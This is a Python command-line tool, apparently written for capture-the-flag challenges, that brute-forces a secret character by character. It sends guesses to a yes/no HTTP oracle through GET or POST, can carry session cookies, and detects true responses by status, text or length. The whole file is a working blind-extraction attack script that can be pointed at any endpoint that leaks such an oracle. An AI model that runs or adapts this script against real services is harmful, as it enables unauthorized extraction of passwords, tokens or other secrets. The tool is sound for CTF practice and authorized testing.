#!/usr/bin/env python3
"""Recover a secret character by character from a yes/no oracle.

The URL (or --post body) contains {} where the current guess goes.
TRUE is decided by --true-status / --true-text / --false-text / --true-len.

    python prefix_oracle.py "http://leak7.chal.deti:8016/oracle?prefix={}" --true-status 200
    python prefix_oracle.py "http://t/check" --post "guess={}" --true-text "correct" --charset hex
    python prefix_oracle.py "http://t/oracle?p={}" --start "flag{" --stop "}" -c "sid=..."
"""
import argparse
import string
import sys
from urllib.parse import quote

import requests

CHARSETS = {
    "flag": string.ascii_lowercase + string.digits + "{}_",
    "flagfull": string.ascii_letters + string.digits + "{}_-!@#$%.",
    "hex": "0123456789abcdef",
    "alnum": string.ascii_letters + string.digits,
    "printable": "".join(c for c in string.printable if c not in "\t\n\r\x0b\x0c"),
}


def main():
    ap = argparse.ArgumentParser(description=__doc__, formatter_class=argparse.RawDescriptionHelpFormatter)
    ap.add_argument("url", help="URL with {} placeholder (or base URL when --post is used)")
    ap.add_argument("--post", help="POST body with {} placeholder (form-encoded)")
    ap.add_argument("--true-status", type=int)
    ap.add_argument("--true-text")
    ap.add_argument("--false-text")
    ap.add_argument("--true-len", type=int)
    ap.add_argument("--charset", default="flag", help="flag|flagfull|hex|alnum|printable or literal chars")
    ap.add_argument("--start", default="", help="known prefix, e.g. 'flag{'")
    ap.add_argument("--stop", default="}", help="stop after this char is found")
    ap.add_argument("--max", type=int, default=200)
    ap.add_argument("-c", "--cookie")
    a = ap.parse_args()
    cs = CHARSETS.get(a.charset, a.charset)
    s = requests.Session()
    if a.cookie:
        s.headers["Cookie"] = a.cookie

    def is_true(guess):
        g = quote(guess, safe="")
        if a.post:
            r = s.post(a.url, data=a.post.replace("{}", g), timeout=10,
                       headers={"Content-Type": "application/x-www-form-urlencoded"})
        else:
            r = s.get(a.url.replace("{}", g), timeout=10)
        if a.true_status is not None and r.status_code != a.true_status:
            return False
        if a.true_text is not None and a.true_text not in r.text:
            return False
        if a.false_text is not None and a.false_text in r.text:
            return False
        if a.true_len is not None and len(r.content) != a.true_len:
            return False
        return True

    known = a.start
    if known and not is_true(known):
        print(f"[!] start prefix {known!r} is not TRUE -- check the oracle settings", file=sys.stderr)
    while len(known) < a.max:
        for ch in cs:
            if is_true(known + ch):
                known += ch
                print(known, flush=True)
                break
        else:
            print(f"[!] no char extends {known!r}", file=sys.stderr)
            break
        if a.stop and known.endswith(a.stop):
            break
    print(known)


if __name__ == "__main__":
    main()
